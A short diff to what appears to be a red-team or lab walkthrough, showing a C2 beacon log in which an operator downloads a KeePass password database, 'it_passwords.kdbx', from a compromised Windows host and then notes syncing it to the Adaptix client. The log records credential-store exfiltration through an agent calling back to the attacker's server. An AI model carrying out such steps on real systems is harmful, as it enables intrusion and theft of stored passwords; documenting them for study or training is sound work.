@@ -123,12 +123,10 @@ Ill download the keepass database to my machine
 
 ```python
 [19/04 15:52:11] operator [1b1823fc] beacon > download it_passwords.kdbx
-
 [19/04 15:52:11] [*] Task: download file
-
 [19/04 15:52:11] [*] Agent called server, sent [34 bytes]
-
 [19/04 15:52:12] [+] The download of the 'C:\stored_passwords\it_passwords.kdbx' file (2782 bytes) has started: [fid ac755ec0]
-
 [19/04 15:52:12] [+] File download complete: [fid ac755ec0]
 ```
+This downloaded it now i can sync it to the client in adaptix to access it
+
